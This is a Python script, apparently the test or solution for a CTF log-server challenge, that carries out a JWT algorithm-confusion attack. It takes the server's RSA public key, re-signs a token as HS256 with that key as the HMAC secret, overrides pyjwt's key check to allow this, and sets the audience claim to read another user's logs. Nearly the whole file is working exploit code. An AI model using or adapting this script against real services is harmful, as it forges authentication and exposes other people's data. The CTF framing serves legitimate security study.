#!/usr/bin/python

# test script for ctf logserver

# requirement: pyjwt (for this example, not for the exploit itself)
#   -> pip install pyjwt

# exploit:
#
# 1.: - client sends POST with some log entries
#     - server saves entries, creates JWT signed with his private RSA key and sends back JWT in response
# 2.: - client collects JWT, changes values to indicate other user than self
#     - client gets servers public rsa key, changes "alg"-field from RS256 to HS256
#     - client signs JWT with servers pubkey (but now as symmetric key for HS256)
#     - client requests entries for other user with manipulated JWT
# 3.: - server checks "alg"-field of token before verifying sig
#     - server verifies JWT with alg from "alg" field (now HS256 instead of original RS256)
#       - still verifies with his rsa pubkey (that now is the symmetric secret for HS256) -> sig valid
#     - server responds with requested ressource
# -> client getting ressources he is not supposed to get
#
# Step 1 is optional. One could just directly create a malicious token instead of altering the collected token

import http.client
import jwt
import hashlib
from random import choice
from string import ascii_letters
from sys import argv, exit

def usage():
    print("{} user server=127.0.0.1 port=65333".format(argv[0]))
    exit(1)

if len(argv) not in (2,3,4):
    usage()

exploit_user = argv[1]

if len(argv) > 2:
    addr = argv[2]
else: addr = "localhost"

if len(argv) == 4:
    try:
        port = int(argv[3])
    except:
        print("invalid port")
        usage()
else: port = 65333

def rand_str(length=5):
    return "".join(choice(ascii_letters) for i in range(length))

# only needed because the lib does not allow key strings like "-----BEGIN PUBLIC KEY..." as HMAC secret
# one could always create the token with some other tool
# returns python bytestring (b'')
def encode_token(payload, pubkey_pem):

    # override prepare_key()
    class customHMACAlgorithm(jwt.algorithms.HMACAlgorithm):

        # would normally raise KeyError if sth like "-----BEGIN PUBLIC KEY-----" in key
        def prepare_key(self, key):
            return jwt.utils.force_bytes(key)

    pyjws_obj = jwt.PyJWT()
    pyjws_obj.unregister_algorithm("HS256")
    pyjws_obj.register_algorithm("HS256", customHMACAlgorithm(hashlib.sha256))
    
    return pyjws_obj.encode(payload, pubkey_pem, algorithm="HS256")


# first get a JWT by posting some logentries

suffix = rand_str()
print("sending POST /exploit_"+suffix+", get JWT from response:")
conn = http.client.HTTPConnection(addr, port=port)
body = "\n".join(rand_str() for i in range(2))
headers={"Content-Length": len(body)}
print(" -> ", end = "")
try:
    conn.request("POST", "/exploit_"+suffix, body=body, headers=headers)
    with conn.getresponse() as res:
        if (res.status == 200):
            jwt_str = res.read()
            print("success")
        else:
            print("failed")
            print("{} {}: {}".format(res.status, res.reason, str(res.read(), "ascii")))
            exit(1)
except Exception as e:
    print("error:", e)
    print("test failed")
    exit(1)

# get servers public key

print("requesting pubkey from server: ")
conn = http.client.HTTPConnection(addr, port=port)
print(" -> ", end = "")
try:
    conn.request("GET", "/pubkey")
    with conn.getresponse() as res:
        if res.status == 200:
            pubkey_str_encoded = str(res.read(), "ascii")
            print("success")
        else:
            print("failed")
            print("{} {}: {}".format(res.status, res.reason, str(res.read(), "ascii")))
            print("exploit unsuccessful")
            exit(1)
except Exception as e:
    print("error:", e)
    print("exploit unsuccessful")    
    exit(1)


####################################
#   actual exploit starting here   #
####################################

# edit token (key will be pubkey in pem format -> "-----BEGIN PUBLIC KEY-----\n...actual key...")

print("create malicious token: ")
header_new = {"alg": "HS256", "typ": "JWT"}
payload_new = jwt.decode(jwt_str, verify=False)
payload_new["aud"] = exploit_user # set audience claim to the user we want to get logs from
print(header_new)
print(payload_new)
print("sign with server public key as HMAC secret: ")
malicious_token = encode_token(payload_new, pubkey_str_encoded) # sign with HS256 and server pubkey as secret
print(" -> success")

# now try to get ressources with malicious token
print("sending GET /"+exploit_user+": ")
conn = http.client.HTTPConnection(addr, port=port)
headers = {"Authorization" : "Bearer "+str(malicious_token, "ascii")}
print(" -> ", end = "")
try:
    conn.request("GET", "/"+exploit_user, headers=headers)
    with conn.getresponse() as res:
        if res.status == 200:
            print("success")
            print("logs from user "+exploit_user+":")
            print("-------------------------")
            print(str(res.read(), "ascii"))
            print("-------------------------")
            print("exploit successful")
        else:
            print("failed")
            print("{} {}: {}".format(res.status, res.reason, str(res.read(), "ascii")))
            exit(1)
except Exception as e:
    print("error:", e)
    print("exploit unsuccessful")    
    exit(1)
